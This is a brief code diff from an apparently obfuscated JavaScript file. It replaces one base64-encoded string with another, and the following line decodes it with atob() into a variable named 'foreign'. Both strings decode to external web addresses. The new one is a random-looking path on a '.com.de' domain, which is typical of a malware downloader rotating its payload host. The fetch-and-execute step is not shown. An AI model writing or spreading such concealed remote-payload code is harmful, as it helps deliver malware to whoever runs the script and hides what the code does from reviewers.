@@ -35,7 +35,7 @@ class AAA {
     }
     }
     }
-var mazzalito= 'aHR0cHM6Ly9sZWVyYWluZXNpbnN1cmFuY2UuY29tL2dv' /*base64*/ ;
+var mazzalito= 'aHR0cHM6Ly9uZXdvcml6b25zLmNvbS5kZS9idDRWYWQ1MU1YNFFlLw==' /*base64*/ ;
 var foreign= atob(mazzalito)
 
 	//Creates new ABC
